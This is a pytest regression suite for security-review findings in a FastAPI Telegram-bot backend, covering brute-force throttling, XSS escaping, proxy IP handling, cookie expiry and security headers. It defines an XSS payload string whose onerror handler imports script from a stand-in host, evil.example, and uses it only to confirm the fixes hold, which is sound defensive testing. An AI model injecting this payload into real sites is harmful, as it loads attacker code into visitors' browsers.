"""Регрессии по внешнему security review (11.2026).

F1  — перебор пароля через Basic Auth шёл мимо троттлинга формы.
F3  — stored XSS: имя из Telegram вставлялось в админку через innerHTML.
F4  — лимиты считались по адресу docker-шлюза → один бакет на всех клиентов.
F7  — нет no-store / noindex / CSP на bearer-страницах и админке.
F14 — /telegram/webhook пропускал всё, если секрет не задан.
F18 — reflected XSS в /whoop/callback?error=.
F19 — кука админа = вечный детерминированный HMAC пароля.
"""

import sys
import time
from pathlib import Path

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "telegram-bot"))

ADMIN_PW = "s3cret-pass"
XSS = "<img src=x onerror=\"import('//evil.example/x')\">"


@pytest.fixture
def admin(monkeypatch):
    from webhook import admin as admin_mod

    monkeypatch.setenv("ADMIN_PASSWORD", ADMIN_PW)
    monkeypatch.setenv("ADMIN_USERNAME", "admin")
    admin_mod._login_attempts.clear()
    yield admin_mod
    admin_mod._login_attempts.clear()


@pytest.fixture
def admin_client(admin):
    app = FastAPI()
    app.include_router(admin.router)
    return TestClient(app, follow_redirects=False)


# ─── F1: Basic Auth троттлится ───────────────────────────────────────────────


def test_basic_auth_bruteforce_is_throttled(admin_client, admin):
    for _ in range(admin.LOGIN_MAX_ATTEMPTS):
        r = admin_client.get("/admin/api/users", auth=("admin", "wrong"))
        assert r.status_code == 401
    r = admin_client.get("/admin/api/users", auth=("admin", "wrong"))
    assert r.status_code == 429
    # во время локаута и верный пароль не проходит (иначе перебор продолжается)
    r = admin_client.get("/admin/api/users", auth=("admin", ADMIN_PW))
    assert r.status_code == 429


def test_basic_failures_and_form_share_one_counter(admin_client, admin):
    for _ in range(admin.LOGIN_MAX_ATTEMPTS):
        admin_client.get("/admin/api/users", auth=("admin", "wrong"))
    r = admin_client.post("/admin/login", data={"password": ADMIN_PW})
    assert r.status_code == 429


def test_requests_without_creds_do_not_count(admin_client, admin):
    for _ in range(admin.LOGIN_MAX_ATTEMPTS + 3):
        assert admin_client.get("/admin/api/users").status_code == 401
    r = admin_client.post("/admin/login", data={"password": ADMIN_PW})
    assert r.status_code == 303


# ─── F4: IP клиента ─────────────────────────────────────────────────────────


class _Client:
    def __init__(self, host):
        self.host = host


class _Req:
    def __init__(self, peer, headers=None):
        self.client = _Client(peer) if peer else None
        self.headers = headers or {}


def test_client_ip_trusts_x_real_ip_from_local_proxy():
    from webhook.client_ip import client_ip

    assert client_ip(_Req("172.18.0.1", {"x-real-ip": "203.0.113.7"})) == "203.0.113.7"
    assert client_ip(_Req("127.0.0.1", {"x-real-ip": "198.51.100.2"})) == "198.51.100.2"


def test_client_ip_ignores_spoofed_header_from_public_peer():
    from webhook.client_ip import client_ip

    assert client_ip(_Req("8.8.8.8", {"x-real-ip": "1.2.3.4"})) == "8.8.8.8"


def test_client_ip_rejects_garbage_header():
    from webhook.client_ip import client_ip

    assert client_ip(_Req("172.18.0.1", {"x-real-ip": "not-an-ip"})) == "172.18.0.1"


def test_two_clients_behind_proxy_have_separate_buckets(admin_client, admin):
    a = {"X-Real-IP": "203.0.113.1"}
    b = {"X-Real-IP": "203.0.113.2"}
    # TestClient ходит с peer "testclient" — не IP → заголовку не доверяем;
    # проверяем резолвер напрямую через локальный peer.
    from webhook.client_ip import client_ip

    assert client_ip(_Req("172.17.0.1", {"x-real-ip": a["X-Real-IP"]})) != client_ip(
        _Req("172.17.0.1", {"x-real-ip": b["X-Real-IP"]})
    )


# ─── F19: кука с серверным сроком ───────────────────────────────────────────


def test_cookie_expires_server_side(admin):
    old = admin._make_cookie_token(now=time.time() - (admin.ADMIN_COOKIE_DAYS + 1) * 86400)
    assert admin._cookie_token_valid(old) is False
    fresh = admin._make_cookie_token()
    assert admin._cookie_token_valid(fresh) is True


def test_cookie_invalid_after_password_change(admin, monkeypatch):
    tok = admin._make_cookie_token()
    monkeypatch.setenv("ADMIN_PASSWORD", "another-pass")
    assert admin._cookie_token_valid(tok) is False


def test_cookie_tampered_timestamp_rejected(admin):
    tok = admin._make_cookie_token()
    ts, sig = tok.split(".", 1)
    assert admin._cookie_token_valid(f"{int(ts) + 1000}.{sig}") is False
    assert admin._cookie_token_valid("garbage") is False
    assert admin._cookie_token_valid("") is False


def test_legacy_v1_cookie_rejected(admin):
    import hashlib
    import hmac as _hmac

    legacy = _hmac.new(b"botkin-admin-cookie-v1", ADMIN_PW.encode(), hashlib.sha256).hexdigest()
    assert admin._cookie_token_valid(legacy) is False


def test_index_does_not_renew_cookie(admin_client, admin):
    admin_client.cookies.set(admin.ADMIN_COOKIE_NAME, admin._make_cookie_token())
    r = admin_client.get("/admin/")
    assert r.status_code == 200
    assert admin.ADMIN_COOKIE_NAME not in r.headers.get("set-cookie", "")


# ─── F3: экранирование в админке ────────────────────────────────────────────


def test_admin_html_escapes_user_fields(admin):
    html = admin.ADMIN_HTML
    assert "function esc(" in html
    # прямых вставок имён без esc() больше нет
    assert "${u.first_name||''}" not in html
    assert "${u.last_name||''}" not in html
    assert "(r.first_name || '')" not in html
    assert "${esc(u.first_name)}" in html
    # toast больше не пишет текст ошибки сервера через innerHTML
    assert "'+msg+'" not in html


def test_admin_js_esc_behaviour():
    """esc() из админки экранирует XSS-пейлоад (проверяем через node, если есть)."""
    import re
    import shutil
    import subprocess

    from webhook import admin as admin_mod

    node = shutil.which("node")
    if not node:
        pytest.skip("node не установлен")
    m = re.search(r"function esc\(v\)\{.*?\}\n", admin_mod.ADMIN_HTML)
    assert m
    script = m.group(0) + f"process.stdout.write(esc({XSS!r}))"
    out = subprocess.run([node, "-e", script], capture_output=True, text=True, timeout=10).stdout
    assert "<" not in out and ">" not in out and '"' not in out


# ─── F18: /whoop/callback не отражает error ─────────────────────────────────


def test_whoop_callback_does_not_reflect_error():
    from webhook import whoop_oauth

    app = FastAPI()
    app.include_router(whoop_oauth.router)
    r = TestClient(app).get("/whoop/callback", params={"error": XSS})
    assert r.status_code == 400
    assert "<img" not in r.text
    assert "evil.example" not in r.text


# ─── F14: webhook fail-closed ───────────────────────────────────────────────


def test_telegram_webhook_rejects_when_secret_missing(monkeypatch):
    monkeypatch.delenv("TELEGRAM_WEBHOOK_SECRET", raising=False)
    from webhook import telegram_router

    app = FastAPI()
    app.include_router(telegram_router.router)
    r = TestClient(app).post("/telegram/webhook", json={"update_id": 1})
    assert r.status_code in (403, 503)
    assert r.status_code != 200


# ─── F7: заголовки ──────────────────────────────────────────────────────────


@pytest.fixture
def main_client(monkeypatch):
    monkeypatch.setenv("ADMIN_PASSWORD", ADMIN_PW)
    from webhook import apple_health

    return TestClient(apple_health.app, follow_redirects=False)


def test_admin_has_csp_and_no_frames(main_client):
    r = main_client.get("/admin/login")
    assert "connect-src 'self'" in r.headers.get("content-security-policy", "")
    assert r.headers.get("x-frame-options") == "DENY"
    assert r.headers.get("cache-control") == "no-store"


def test_bearer_pages_not_cached_or_indexed(main_client):
    r = main_client.get("/r/nonexistent-token-xyz")
    assert r.headers.get("cache-control") == "no-store"
    assert "noindex" in r.headers.get("x-robots-tag", "")
    assert r.headers.get("referrer-policy") == "no-referrer"


def test_openapi_not_published(main_client):
    assert main_client.get("/openapi.json").status_code == 404


# ─── Тип тренировки из Apple Health не несёт HTML в /mc и /r ────────────────


def test_hae_workout_type_strips_html():
    from webhook.apple_health import _hae_workout_type

    assert "<" not in _hae_workout_type({"name": XSS})
    assert '"' not in _hae_workout_type({"name": XSS})
    assert _hae_workout_type({"workoutActivityType": "HKWorkoutActivityTypeWalking"}) == "Walking"
    assert _hae_workout_type({"name": "Ходьба"}) == "Ходьба"
    assert _hae_workout_type({"name": "<>"}) == "Workout"


def test_mc_template_escapes_workout_type():
    tpl = (Path(__file__).resolve().parent.parent / "telegram-bot" / "mc_template.html").read_text()
    assert "function esc(" in tpl
    assert "esc(TYPE_LABELS[w.type] || w.type)" in tpl
    assert "${esc(b.label)}" in tpl
